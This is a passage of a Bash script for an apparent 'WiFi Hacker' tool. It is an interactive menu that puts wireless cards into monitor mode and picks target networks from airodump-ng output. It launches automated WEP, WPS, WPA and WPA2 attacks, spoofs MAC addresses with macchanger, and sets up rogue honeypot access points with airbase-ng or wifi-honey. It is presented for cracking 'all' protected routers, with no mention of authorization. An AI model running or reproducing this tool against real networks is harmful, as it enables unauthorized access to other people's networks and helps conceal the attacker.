	echo ""
	echo ""
	echo "1) Check For New Update"
	echo ""
	echo "2) Apply New Update"
	echo ""
	echo ""

	read pause

}


checkUpdate(){

	currentTask="checkUpdate"
	
	wget -O "$updateTemp" $updateMaster

	cat $updateTemp | grep $versionBase

	read pause

	rm $updateTemp

}


getUpdate(){

	currentTask="getUpdate"
	
	# Get Base Script Name
	#script=$(printf '%s\n' "${0##*/}")
	script=$(basename -- "$0")
	
	wget -O "$initPath/$script.tmp" $updateMaster

	read pause

}


############################################################################
#   UPDATE STUFF END   #####################################################
############################################################################





############################################################################
#   OTHER MISC STUFF BEGIN   ###############################################
############################################################################


checkRootStatus(){

	userPriv=none

	isRoot=$(whoami | grep root)

	#echo "$isRoot"

	case "$isRoot" in

		"root")
		userPriv=root

	esac

	if [ "$userPriv" != "root" ]; then
		noRootAccess
	fi

}



noRootAccess(){

	banner
	bannerStats

	$red
	echo "Yikes! No Root Access!"
	$white
	echo ""
	echo ""
	echo "I Currently Have Nothing Scripted To Handle This :("
	echo ""
	echo "Please login as a root user and try again!"
	echo ""
	echo ""
	echo "Press ENTER to exit this script...."
	echo ""
	echo ""

	read pause


	bannerExit

}


checkConnectionStatus(){

	ipStatus="0"
	ipStatusText="None"

	ipStatusTemp=$(ping -c 1 google.com | grep "1 received")

	ipStatus=$(echo "$ipStatusTemp" | cut -c1)


	case "$ipStatus" in

		"1")
		ipStatus="1"
		ipStatusText="Wifi"
		;;

	esac

	case "$ipStatusText" in

		"None")
		ipStatus="0"
		;;

	esac

	#echo "$ipStatusText"

	#read pause

}


fixAirmonCompat(){

	$terminal airmon-ng check kill&
	#airmon-ng check kill&

}


checkWifiandDisplayMessage(){

	case "$ipStatusText" in

		"m"|"M")
		menuMain
		;;

		"A" | "a")
		menuAdvanced
		;;

		"S" | "s")
		checkForEmptyEncryptionType

		case "$bssid" in

			"")
			menuMain
			;;

		esac

		if [ "$bssid" != "" ]; then
			menuSessionSave
		fi
		;;

		"L" | "l")
		checkForEmptyEncryptionType

		#case "$bssid" in

		#"")
		#menuMain
		#;;

		#esac

		#if [ "$bssid" != "" ]; then
		menuSessionLoad
		#fi
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

		"Wifi")
		banner
		echo ""
		echo "YOU MUST DISCONNECT FROM WIFI BEFORE CONTINUING!!!!"
		echo ""
		echo ""
		echo "PRESS ENTER TO RETURN TO MAIN MENU...."
		echo ""
		echo ""

		read pause

		menuMain
		;;

	esac

}

isUnreleased(){

	currentTask="isUnreleased"
	lastMenuID="isUnreleased"

	sessionCreatePaths
	sessionRemoveEmpty

	bannerSlim

	$red
	echo ""
	echo "**********************************************************"
	echo "YOU MUST AGREE TO THESE TERMS BEFORE USING THIS SOFTWARE!"
	echo "**********************************************************"
	echo ""
	$cyan
	echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
	echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
	echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
	echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
	echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
	echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
	echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
	echo "***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***"
	echo ""
	$red
	echo "**********************************************************"
	echo "YOU MUST AGREE TO THESE TERMS BEFORE USING THIS SOFTWARE!"
	echo "**********************************************************"
	echo ""
	echo ""
	echo ""
	$white
	echo "PLEASE PRESS "\""Y"\"" AND ENTER TO ACCEPT AND CONTINUE"
	echo ""
	echo ""

	read agreeToDisclaimer

	case "$agreeToDisclaimer" in

		"")
		bannerExit
		;;

		"Y" | "y")
		fixNegativeOneChannelError
		fixAirmonCompat
		#startNetworkManager
		#killNetworkManager
		#killWpaSupplicant
		#initMonitorMode
		#stopMonitorMode
		menuMain
		;;

		*)
		bannerExit
		;;

	esac

}


# Tries fixing issues with connection staying persistant to WiFi
forceDisconnectWifi() {

	#stopMonitorMode
	#killNetworkManager
	NetworkManager
	#disableChannelHopping
	enableChannelHopping

}


############################################################################
#   OTHER MISC STUFF END   #################################################
############################################################################





############################################################################
#   MENUS: MAIN BEGIN   ####################################################
############################################################################


menuMain(){

	currentTask="menuMain"
	lastMenuID="menuMain"

	checkRootStatus
	sessionCreatePaths
	sessionRemoveEmpty

	checkConnectionStatus

	case "$ipStatus" in

		"1")
		banner
		echo ""
		echo "Loading Menu...."	
		echo ""
		echo ""

		forceDisconnectWifi
		checkConnectionStatus
		menuMain
		;;

		"0")
		banner
		echo ""
		#echo "Welcome to the WiFi Hacker script!"
		echo "Compatible with all WEP/WPA/WPA2/WPS protected WiFi routers."
		echo ""
		$red
		echo "**********************************************************************"
		echo "YOU MUST DISCONNECT FROM ANY WIRELESS CONNECTIONS BEFORE CONTINUING!!!"
		echo "**********************************************************************"
		echo ""

		case "$ipStatus" in
			"0")
			$green
			;;

			"1")
			$red
			;;
		esac
		echo "You are currently connected to: $ipStatusText"
		$white
		echo ""
		echo ""
		#$cyan
		echo "0) Full Automatic Mode (Applies To All Encryption Types)"
		#$white
		echo ""
		echo "1) WEP Mode (Commands can be executed from a menu to easily circumvent any WEP connection)"
		echo ""
		echo "2) WPS Mode (May also have WPA, WPA2, or WEP displayed)"
		echo ""
		echo "3) WPA Mode (Capture 4-way handshake, dictionary attack, bruteforce and others)"
		echo ""
		echo "4) WPA2 Mode (Almost identical to WPA attacks)"
		echo ""
		echo ""
		echo ""
		echo "Select a mode from above and press Enter:"
		echo ""

		read getMode


		case "$getMode" in

			"0")
			checkConnectionStatus
			checkWifiandDisplayMessage
			menuAttacksAllWifiteAuto
			menuMain
			;;

			"1")
			checkConnectionStatus
			checkWifiandDisplayMessage
			mkdir $capturePathWEP
			encryptionType="wep"
			encryptionTypeText="WEP"
			checkSpoofStatus
			menuAuto
			;;

			"2")
			checkConnectionStatus
			checkWifiandDisplayMessage
			mkdir $capturePathWPS
			encryptionType="wps"
			encryptionTypeText="WPS"
			checkSpoofStatus
			menuAuto
			;;

			"3")
			checkConnectionStatus
			checkWifiandDisplayMessage
			mkdir $capturePathWPA
			encryptionType="wpa"
			encryptionTypeText="WPA"
			checkSpoofStatus
			menuAuto
			;;

			"4")
			checkConnectionStatus
			checkWifiandDisplayMessage
			mkdir $capturePathWPA2
			encryptionType="wpa2"
			encryptionTypeText="WPA2"
			checkSpoofStatus
			menuAuto
			;;

			"")
			menuMain
			;;

			"M" | "m")
			menuMain
			;;

			"A" | "a")
			menuAdvanced
			;;

			"S" | "s")
			checkForEmptyEncryptionType

			case "$bssid" in

				"")
				menuMain
				;;

			esac

			if [ "$bssid" != "" ]; then
				menuSessionSave
			fi
			;;

			"L" | "l")
			checkForEmptyEncryptionType

			#case "$bssid" in

			#"")
			#menuMain
			#;;

			#esac

			#if [ "$bssid" != "" ]; then
			menuSessionLoad
			#fi
			;;

			"U" | "u")
			menuUpdate
			;;

			"H" | "h")
			menuHelp
			;;

			"E" | "e")
			menuExtras
			;;

			"X" | "x")
			killAll
			stopMonitorMode
			bannerExit
			;;

			*)
			menuMain
			;;

		esac
		;;

	esac

	#menuMain
}


menuAuto(){

	currentTask="menuAuto"
	lastMenuID="menuAuto"

	case "$encryptionTypeText" in

		"Empty")
		menuMain
		;;

	esac

	#sessionCopyNewCaptureFiles
	sessionRemoveEmpty

	banner
	bannerStats
	
	$green
	echo ""
	echo "You are ready to begin the $encryptionTypeText attack!"
	echo ""
	$white

	case "$encryptionTypeText" in
		"WEP")
		echo "To perform a fully automated attack, type AUTOWEP end press ENTER"
		;;
	esac

	case "$encryptionTypeText" in
		"WPS")
		echo "To perform a fully automated attack, type AUTOWPS end press ENTER"
		;;
	esac

	case "$encryptionTypeText" in
		"WPA")
		echo "To perform a fully automated attack, type AUTOWPA end press ENTER"
		;;
	esac

	case "$encryptionTypeText" in
		"WPA2")
		echo "To perform a fully automated attack, type AUTOWPA2 end press ENTER"
		;;
	esac

	echo ""
	echo "YOU MAY NOW OPTIONALLY PRESS THE \"W\" KEY ON KEYBOARD TO YOUR SPOOF MAC ADDRESS"
	echo ""
	echo ""
	echo ""
	echo "The next step will run an airodump-ng session in a new window."
	echo ""
	echo "Once you enter all required info, the new window will be closed"
	echo ""
	echo ""
	echo ""
	echo "Press ENTER to clear the current session and select a target...."
	echo ""
	echo "YOU MAY ALSO PRESS THE \"P\" KEY ON KEYBOARD TO LOAD PREVIOUS SESSION"
	echo ""

	read readyForAirodumpScan

	case "$readyForAirodumpScan" in

		"")
		killAll
		checkForEmptyEncryptionType
		autoModeNoPreviousSession
		;;

		"P" | "p")
		checkForEmptyEncryptionType

		checkForEmptyCredentials "bssid"
		checkForEmptyCredentials "essid"
		checkForEmptyCredentials "channel"

		autoModeUsePreviousSession
		;;

		"W" | "w")
		#returnTo="menuAuto"
		spoofMacAddress
		menuAuto
		;;

		"M" | "m")
		spoofStatus="0"
		killAll
		stopMonitorMode
		menuMain
		;;

		"A" | "a")
		menuAdvanced
		;;

		"S" | "s")
		checkForEmptyEncryptionType

		case "$bssid" in

			"")
			menuMain
			;;

		esac

		if [ "$bssid" != "" ]; then
			menuSessionSave
		fi
		;;

		"L" | "l")
		checkForEmptyEncryptionType

		#case "$bssid" in

		#"")
		#menuMain
		#;;

		#esac

		#if [ "$bssid" != "" ]; then
		menuSessionLoad
		#fi
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

		"autowep" | "AUTOWEP" | "AutoWEP" | "AutoWep" | "autoWEP" | "autoWep")
		menuAttacksWEPWifiteAuto
		;;

		"autowps" | "AUTOWPS" | "AutoWPS" | "AutoWps" | "autoWPS" | "autoWps")
		menuAttacksWPSWifiteAuto
		;;

		"autowpa" | "AUTOWPA" | "AutoWPA" | "AutoWpa" | "autoWPA" | "autoWpa")
		menuAttacksWPAWifiteAuto
		;;

		"autowpa2" | "AUTOWPA2" | "AutoWPA2" | "AutoWpa2" | "autoWPA2" | "autoWpa2")
		menuAttacksWPA2WifiteAuto
		;;

		*)

		menuAuto

		;;

	esac

	#restartProcesses

	menuMain

}


menuAdvanced(){

	currentTask="menuAdvanced"
	#lastMenuID="menuAdvanced"

	interface="None"

	banner
	bannerStats

	echo ""
	echo "SORRY I GOT LAZY AND NEVER CODED THIS MENU"
	echo "WILL BE AVAILABLE SOOOOOOOOOON!"
	echo ""
	echo ""
	echo "Advanced Menu"
	echo ""
	echo ""
	echo "1) Monitor Mode Options"
	echo ""
	echo "2) Honeypot Mode and Attacks"
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo "Select an option and press ENTER:"
	echo ""
	echo ""

	read getAdvancedOptionMain

	case "$getAdvancedOptionMain" in

		"")
		$lastMenuID
		#menuMain
		#menuAdvanced
		;;

		"M" | "m")
		killAll
		stopMonitorMode
		menuMain
		;;

		"A" | "a")
		menuAdvanced
		;;

		"S" | "s")
		menuSessionSave
		;;

		"L" | "l")
		menuSessionLoad
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

		*)
		$lastMenuID
		#menuMain
		#menuAdvanced
		;;

	esac

	#restartProcesses

	$lastMenuID

}


menuExtras(){

	currentTask="menuExtras"
	#lastMenuID="menuExtras"

	banner
	bannerStats

	echo ""
	echo "1) Backup All Sessions and Capture Files (Full Backup of all saved files to ZIP file)"
	echo "2) Clean Capture Files (Removes all saved .cap, .xor, .ivs, .csv, and .netxml files)"
	echo "3) Clean Session Files (Removes all saved WEP, WPS, WPA, WPA2 *.sessions files)"
	echo ""
	echo "4) Change Active Terminal (Switch between Gnome, Konsole, X-Term, and User Selected)"
	echo ""
	echo "5) Start NetworkManager"
	echo "6) Stop NetworkManager"
	echo "7) Stop wpa_supplicant"
	echo "8) Stop wpa_cli"
	echo ""
	echo "9) Open Interface Options Menu"
	echo ""
	echo "R) Return To Previous Menu"
	echo ""
	echo ""
	echo "Select an option from above and press ENTER:"
	echo ""
	echo ""

	read getExtras

	case "$getExtras" in

		"")
		menuExtras
		;;

		"1")
		backupSessionFiles
		;;

		"2")
		cleanCaptureFiles
		;;

		"3")
		cleanSessionFiles
		;;

		"4")
		menuChangeTerminal
		;;

		"5")
		startNetworkManager
		;;

		"6")
		killNetworkManager
		;;

		"7")
		wpa_supplicant stop
		;;

		"8")
		wpa_cli terminate
		;;

		"9")
		menuExtrasInterface
		;;

		"r" | "R")
		$lastMenuID
		;;

		"M" | "m")
		menuMain
		;;

		"A" | "a")
		menuAdvanced
		;;

		"S" | "s")
		menuSessionSave
		;;

		"L" | "l")
		menuSessionLoad
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

		*)
		menuExtras
		;;

	esac

	menuExtras

}

menuExtrasInterface(){

	currentTask="menuExtrasInterface"
	#lastMenuID="menuExtrasInterface"

	banner
	bannerStats

	echo ""

	echo "1) Enable Channel Hopping: $interface"
	echo "2) Disable Channel Hopping: $interface"
	echo ""
	echo "3) Bring Up Interface: $interfaceMonitor"
	echo "4) Bring Down Interface: $interfaceMonitor"
	echo ""
	echo "5) Switch Interface To Managed"
	echo "6) Switch Interface To Monitor"
	echo ""
	echo "7) Fix Airmon Conflicting Processes"
	echo ""
	echo "8) Get \"ifconfig\" Output"
	echo "9) Get \"iwconfig\" Output"
	echo ""
	echo "R) Return To Previous Menu"
	echo ""
	echo ""
	echo "Select an option from above and press ENTER:"
	echo ""
	echo ""

	read getExtrasInterface

	case "$getExtrasInterface" in

		"")
		menuInterface
		;;

		"1")
		enableChannelHopping
		;;

		"2")
		disableChannelHopping
		;;

		"3")
		interfaceUp
		;;

		"4")
		interfaceDown
		;;

		"5")
		interfaceManaged
		;;

		"6")
		interfaceMonitor
		;;

		"7")
		fixAirmonCompat
		;;

		"8")
		showIfConfig=$(ifconfig)
		banner
		bannerStats
		echo ""
		echo "$showIfConfig"
		echo ""
		echo ""	
		echo ""	
		echo "Press ENTER to continue..."	
		echo ""	
		echo ""	
		read pause
		;;

		"9")
		showIwConfig=$(iwconfig)
		banner
		bannerStats
		echo ""
		echo "$showIwConfig"
		echo ""
		echo ""	
		echo ""	
		echo "Press ENTER to continue..."	
		echo ""	
		echo ""	
		read pause
		;;

		"r" | "R")
		#$lastMenuID
		menuExtras
		;;

		"M" | "m")
		menuMain
		;;

		"A" | "a")
		menuAdvanced
		;;

		"S" | "s")
		menuSessionSave
		;;

		"L" | "l")
		menuSessionLoad
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

		*)
		menuExtrasInterface
		;;

	esac

	menuExtrasInterface

}


menuHelp(){

	currentTask="menuHelp"
	#lastMenuID="menuHelp"

	banner
	bannerStats

	echo ""
	echo "*******************************************"
	echo "CURENTLY NOT WORKING!!!"
	echo ""
	echo "PRESS ENTER TO RETURN TO PREVIOUS MENU!"
	echo "*******************************************"
	echo ""
	echo ""
	echo ""
	echo "Welcome to the Help Section!"
	echo ""
	echo ""
	echo ""
	echo "CURRENTLY NOT AVAILABLE!"
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""

	read getHelp

	case "$getHelp" in

		"")
		$lastMenuID
		#menuMain
		#menuHelp
		;;

		"M" | "m")
		menuMain
		;;

		"A" | "a")
		menuAdvanced
		;;

		"S" | "s")
		menuSessionSave
		;;

		"L" | "l")
		menuSessionLoad
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

		*)
		$lastMenuID
		#menuMain
		#menuHelp
		;;

	esac

	$lastMenuID

}


menuChangeTerminal(){

	currentTask="menuChangeTerminal"
	#lastMenuID="menuChangeTerminal"

	banner


	echo ""
	echo "Select a new terminal to use"
	echo ""
	echo ""
	echo "Current Terminal: $terminal"
	echo ""
	echo ""
	echo "1) Gnome: $terminalGnome"
	echo ""
	echo "2) Konsole: $terminalKonsole"
	echo ""
	echo "3) X-Term: $terminalXterm"
	echo ""
	echo "4) Custom (User Selected)"
	echo ""
	echo "5) Return To Previous Menu"
	echo ""
	echo ""

	read getTerminalType

	case "$getTerminalType" in

		"")
		menuChangeTerminal
		;;

		"1")
		terminal="$terminalGnome"
		terminalText="Gnome"
		;;

		"2")
		terminal="$terminalKonsole"
		terminalText="Konsole"
		;;

		"3")
		terminal="$terminalXterm"
		terminalText="Xterm"
		;;

		"4")
		banner
		echo ""
		echo "Input a terminal string with arguments and press ENTER:"
		echo ""
		echo ""
		echo "Example: $terminalGnome"
		echo ""
		echo ""

		read newTerminal

		case "$newTerminal" in

			*)
			terminal="$newTerminal"
			terminalText="Custom"
			;;

		esac

		;;

		"5")
		menuExtras
		;;

		"M" | "m")
		menuMain
		;;

		"A" | "a")
		menuAdvanced
		;;

		"S" | "s")
		menuSessionSave
		;;

		"L" | "l")
		menuSessionLoad
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

		*)
		menuChangeTerminal
		;;

	esac

	menuMain

}


############################################################################
#   MENUS: MAIN END   ######################################################
############################################################################





############################################################################
#   MENUS: SESSIONS BEGIN   ################################################
############################################################################


menuSessionSave(){

	# Not needed for this menu
	currentTask="menuSessionSave"
	#lastMenuID="menuSessionSave"

	banner
	bannerStats

	echo "Session Save Menu"
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo "Save As: "$capturePath/$encryptionType/$encryptionType.sessions""
	echo ""
	echo ""
	echo ""
	echo "Press \"S\" and ENTER to save session file now"
	echo ""
	echo ""
	echo "You may also just press ENTER to return to the previous menu...."
	echo ""
	echo ""

	getSession="S"
	#read getSession

	case "$getSession" in

		"")
		$lastMenuID
		;;

		"M" | "m")
		menuMain
		;;

		"A" | "a")
		menuAdvanced
		;;

		"S" | "s")
		sessionSave
		;;

		"L" | "l")
		menuSessionLoad
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

		*)
		$lastMenuID
		;;

	esac

	$lastMenuID

}


menuSessionLoad(){

	# Not needed for this menu
	currentTask="menuSessionLoad"
	#lastMenuID="menuSessionLoad"

	banner
	bannerStats

	echo "Session Load Menu"
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo "Current File Loaded: $capturePath/$encryptionType/$encryptionType.sessions"
	echo ""
	echo ""
	echo ""
	echo "Press \"L\" and ENTER to load session file now"
	echo ""
	echo ""
	echo "You may also just press ENTER to return to the previous menu...."
	echo ""
	echo ""

	getSession="L"
	#read getSession

	case "$getSession" in

		"")
		$lastMenuID
		;;

		"M" | "m")
		menuMain
		;;

		"A" | "a")
		menuAdvanced
		;;

		"S" | "s")
		menuSessionSave
		;;

		"L" | "l")
		sessionLoad
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

		*)
		$lastMenuID
		;;

	esac

	$lastMenuID

}


menuHoneyPotMode(){

	currentTask="menuHoneyPotMode"

	initMonitorMode

	banner
	bannerStats

	echo ""
	echo "I Am HoneyPot Mode"
	echo ""
	echo "I Am Also Broken :("
	echo ""
	echo ""
	echo ""
	echo "1) Use Airbase-ng"
	echo ""
	echo "2) Use Wifi-Honey"
	echo ""
	echo "3) Use a Custom Binary"
	echo ""
	echo ""
	echo ""
	echo "Select an option and press ENTER:"
	echo ""
	echo ""

	read getHoneyPotOptionMain

	case "$getHoneyPotOptionMain" in

		"")
		menuHoneyPotMode
		#$lastMenuID
		#menuMain
		#menuAdvanced
		;;

		"1")
		getBSSID
		$terminal airbase-ng -a $bssid -i $interfaceMonitor -h $macAddressMonitor -v &
		;;

		"2")
		getESSID
		getChannel
		$terminal wifi-honey $essid $channel $interfaceMonitor &
		;;

		"3")
		echo "Custom Binary"
		read pause
		menuHoneyPotMode
		;;

		"M" | "m")
		killAll
		stopMonitorMode
		menuMain
		;;

		"A" | "a")
		menuAdvanced
		;;

		"S" | "s")
		menuSessionSave
		;;

		"L" | "l")
		menuSessionLoad
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

		*)
		menuHoneyPotMode
		#$lastMenuID
		#menuMain
		#menuAdvanced
		;;

	esac

	#restartProcesses

	menuHoneyPotMode
	#$lastMenuID

}


############################################################################
#   MENUS: SESSIONS END   ##################################################
############################################################################





############################################################################
#   GET CREDENTIALS BEGIN   ################################################
############################################################################


textGetTargetInfo(){

echo ""
echo "THERE SHOULD NOW BE A NEW TERMINAL WINDOW OPEN"
echo ""
echo "YOU CAN USE THIS AIRODUMP-NG WINDOW TO GATHER ALL NEEDED INFORMATION"
echo ""
echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
echo ""
echo "YOU MAY NEED TO EXTEND THE WINDOW WIDER TO SEE THE ESSID NAMES"
echo ""
echo ""

case "$encryptionTypeText" in
	"WPS")
	$green
	echo "WPS TARGETS MAY HAVE \"1.0, 1.0 LAB, DISP, KPAD\" OR ANOTHER VARIANT UNDER \"WPS\" COLUMN"
	echo ""
	echo "ALL TARGETS THAT SUPPORT WPS MAY ALSO HAVE \"OPN\", \"WEP\", \"WPA\", or \"WPA2\" UNDER \"ENC\" COLUMN"
	$white
	echo ""
	echo ""
	;;
esac

case "$encryptionTypeText" in
	"WEP")
	$green
	#echo "WEP TARGETS MAY HAVE \"WEP\" UNDER THE \"ENC\" and \"CIPHER\" COLUMNS"
	echo "CURRENTLY SET TO ONLY SCAN FOR \"WEP\" TARGETS"
	$white
	echo ""
	echo ""
	;;
esac

case "$encryptionTypeText" in
	"WPA")
	$green
	echo "WPA TARGETS MAY HAVE \"WPA\" UNDER THE \"ENC\" and \"CCMP\" UNDER \"CIPHER\" COLUMNS"
	$white
	echo ""
	echo ""
	;;
esac

case "$encryptionTypeText" in
	"WPA2")
	$green
	echo "WPA2 TARGETS MAY HAVE \"WPA2\" UNDER THE \"ENC\" and \"CCMP\" UNDER \"CIPHER\" COLUMNS"
	$white
	echo ""
	echo ""
	;;
esac

}


getESSID(){

	currentTask="getESSID"

	banner
	bannerStats

	textGetTargetInfo

	echo "PASTE or type the Target ESSID Here and press ENTER:"
	echo ""
	echo "Example: NETGEAR"
	echo ""
	echo ""
	
	$cyan
	read getESSIDTemp

	case "$getESSIDTemp" in

		"")
		getESSID
		;;

		"M" | "m")
		killAll
		stopMonitorMode
		menuMain
		;;

		"A" | "a")
		menuAdvanced
		;;

		"S" | "s")
		menuSessionSave
		;;

		"L" | "l")
		menuSessionLoad
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

		*)
		essid="$getESSIDTemp"
		;;

	esac

	$white
}


getBSSID(){

	currentTask="getBSSID"

	banner
	bannerStats

	textGetTargetInfo

	echo "PASTE or type the Target BSSID Here and press ENTER:"
	echo ""
	echo "Example: 00:11:22:33:44:55"
	echo ""
	echo ""

	$cyan
	read getBSSIDTemp

	case "$getBSSIDTemp" in

		"")
		getBSSID
		;;

		"M" | "m")
		killAll
		stopMonitorMode
		menuMain
		;;

		"A" | "a")
		menuAdvanced
		;;

		"S" | "s")
		menuSessionSave
		;;

		"L" | "l")
		menuSessionLoad
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

		*)
		bssid="$getBSSIDTemp"
		;;

	esac

	$white
}


getChannel(){

	currentTask="getChannel"

	banner
	bannerStats

	textGetTargetInfo

	echo "PASTE or type the Target Channel Here and press ENTER:"
	echo ""
	echo "Example: 6"
	echo ""
	echo ""

	$cyan
	read getChannelTemp

	case "$getChannelTemp" in

		"")
		getChannel
		;;

		"M" | "m")
		killAll
		stopMonitorMode
		menuMain
		;;

		"A" | "a")
		menuAdvanced
		;;

		"S" | "s")
		menuSessionSave
		;;

		"L" | "l")
		menuSessionLoad
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

		*)
		channel="$getChannelTemp"
		;;

	esac

	$white
}


############################################################################
#   GET CREDENTIALS END   ##################################################
############################################################################





############################################################################
#   MAC ADDRESS STUFF BEGIN   ##############################################
############################################################################


getMacAddress(){

	currentTask="getMacAddress"

	macAddress=$(ip link show $interface | tail -n 1 |  cut -f 6 -d " ")

}


getMacAddressMonitor(){

	currentTask="getMacAddressMonitor"

	macAddressMonitor=$(ip link show $interfaceMonitor | tail -n 1 |  cut -f 6 -d " ")

	case "$isDebugMode" in
		"1")
		echo "interface: $interfaceMonitor"
		echo "mac: $macAddressMonitor"
		read pause
		;;
	esac

}


setMacAddress(){

	currentTask="setMacAddress"

	ifconfig $interface down
	macchanger -m $getNewMacAdressTemp $interface
	ifconfig $interface up

	spoofStatus="1"

	macAddress="$getNewMacAdressTemp"

}


setMacAddressMonitor(){

	currentTask="setMacAddressMonitor"

	ifconfig $interfaceMonitor down
	macchanger -m $getNewMacAdressTemp $interfaceMonitor
	ifconfig $interfaceMonitor up

	spoofStatus="1"

	macAddressMonitor="$getNewMacAdressTemp"

}


getRandomMacAddress(){

	currentTask="getRandomMacAddress"

	ifconfig $interface down
	macchanger -r $interface
	ifconfig $interface up

	spoofStatus="1"

	getMacAddress

	#macAddress="$getNewMacAdressTemp"

}


getRandomMacAddressMonitor(){

	currentTask="getRandomMacAddressMonitor"

	ifconfig $interfaceMonitor down
	macchanger -r $interfaceMonitor
	ifconfig $interfaceMonitor up

	spoofStatus="1"

	getMacAddressMonitor

	#macAddressMonitor="$getNewMacAdressTemp"

}


spoofMacAddress(){

	currentTask="spoofMacAddress"
	#lastMenuID="spoofMacAddress"

	banner

	bannerStats

	echo ""
	echo "To choose a random MAC Address, press the \"R\" key and press ENTER"
	echo ""
	echo ""
	echo "Enter the New MAC Address and press ENTER:"
	echo ""
	echo "Example: 00:11:22:33:44:55"
	echo ""
	echo ""

	read getNewMacAdressTemp

	case "$getNewMacAdressTemp" in

		"")
		spoofMacAddress
		;;

		"R" | "r")
		getRandomMacAddress
		getRandomMacAddressMonitor
		#$returnTo
		;;

		"M" | "m")
		spoofStatus="0"
		killAll
		stopMonitorMode
		menuMain
		;;

		"A" | "a")
		menuAdvanced
		;;

		"S" | "s")
		menuSessionSave
		;;

		"L" | "l")
		menuSessionLoad
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

		*)
		setMacAddress
		setMacAddressMonitor
		#$returnTo
		;;

	esac

}


checkSpoofStatus(){

	case "$spoofStatus" in

		"0")
		#blank=""
		initMonitorMode
		;;

	esac

}


############################################################################
#   MAC ADDRESS STUFF END   ################################################
############################################################################





############################################################################
#   MONITOR MODE STUFF BEGIN   #############################################
############################################################################


initMonitorMode(){

	currentTask="initMonitorMode"

	#killProcesses
	stopMonitorMode

	disableChannelHopping
	enableChannelHopping

	getWirelessInterfaces

	banner

	initMon=""

	case "$initMon" in

		"")
		getMacAddress
		setMonitorMode
		getMacAddressMonitor
		getWirelessInterfaces "refresh"
		;;

		"M" | "m")
		menuMain
		;;

		"A" | "a")
		menuAdvanced
		;;

		"S" | "s")
		menuSessionSave
		;;

		"L" | "l")
		menuSessionLoad
		;;

		"U" | "u")
		menuUpdate
		;;

		"H" | "h")
		menuHelp
		;;

		"E" | "e")
		menuExtras
		;;

		"X" | "x")
		killAll
		stopMonitorMode
		bannerExit
		;;

		*)
		getMacAddress
		setMonitorMode
		getMacAddressMonitor
		#getWirelessInterfaces
		;;

	esac

}


setMonitorMode(){

	currentTask="setMonitorMode"

	#interfaceMonitor="mon0"
	#echo "$interface"
	#read pause
	$startMonitorMode $interface

}


stopMonitorMode(){

	currentTask="stopMonitorMode"

	killMsg="Killing all active previous monitor mode interfaces...."

	# Older style airmon-ng
	killMonA="mon"

	# Newer 1.2+ style airmon-ng
	killMonB1="wlan"
	killMonB2="mon"

	killCounter="0"

	# I just selected 12 as a number that I feel nobody would have more wifi adapters than
	killCounterMax="12"

	# Initial mon0 or wlan0mon before loop
	case "$killCounter" in

		"0")
		banner
		$white
		echo ""
		echo $killMsg
		$red
